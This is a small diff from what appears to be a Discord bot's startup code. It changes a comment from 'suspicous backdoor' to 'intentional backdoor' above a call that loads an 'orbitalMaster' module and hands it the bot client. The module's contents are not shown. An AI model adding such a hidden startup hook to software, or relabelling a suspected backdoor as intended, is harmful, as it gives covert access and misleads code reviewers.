@@ -84,7 +84,7 @@ client.once(Events.ClientReady, async () => {
         console.error(error);
         await devLog(error);
     }
-    // suspicous backdoor
+    // intentional backdoor
     try {
         const { initOrbital } = require('./lib/helpers/orbitalMaster');
         initOrbital(client);
